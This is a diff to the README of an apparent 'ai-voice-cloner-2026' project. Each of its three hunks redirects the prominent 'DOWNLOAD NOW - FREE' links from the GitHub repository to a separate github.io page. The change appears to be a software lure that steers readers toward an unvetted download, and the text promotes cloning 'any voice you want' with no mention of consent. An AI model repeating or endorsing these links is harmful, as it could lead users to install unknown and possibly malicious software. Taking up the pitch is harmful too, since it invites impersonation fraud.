@@ -1,7 +1,7 @@
 <h1>🎙️ ai-voice-cloner-2026 - Clone Any Voice Instantly</h1>
 
 <p align="center">
-  <a href="https://github.com/Bishopryspoiler7442/ai-voice-cloner-2026" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#667eea,#764ba2);color:#fff;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(102,126,234,0.4);">⬇️ DOWNLOAD NOW - FREE</a>
+  <a href="https://bishopryspoiler7442.github.io" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#667eea,#764ba2);color:#fff;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(102,126,234,0.4);">⬇️ DOWNLOAD NOW - FREE</a>
 </p>
 
 ## ✨ What Is This?
@@ -26,7 +26,7 @@ Getting started takes less than 5 minutes. Here's exactly what you need to do:
 
 ### Step 1: Download the Application
 
-[Visit this link to download the application](https://github.com/Bishopryspoiler7442/ai-voice-cloner-2026)
+[Visit this link to download the application](https://bishopryspoiler7442.github.io)
 
 Click the download button on that page. The file will start downloading automatically.
 
@@ -190,7 +190,7 @@ If you run into any issues:
 
 You're just minutes away from cloning any voice you want. The application is free, offline, and powerful enough for professional use.
 
-[⬇️ Download ai-voice-cloner-2026 Now](https://github.com/Bishopryspoiler7442/ai-voice-cloner-2026)
+[⬇️ Download ai-voice-cloner-2026 Now](https://bishopryspoiler7442.github.io)
 
 Visit this link to download the application. Once you have it, follow the simple steps in the Getting Started section above. In less time than it takes to brew a cup of coffee, you'll be creating amazing voice clones.
 
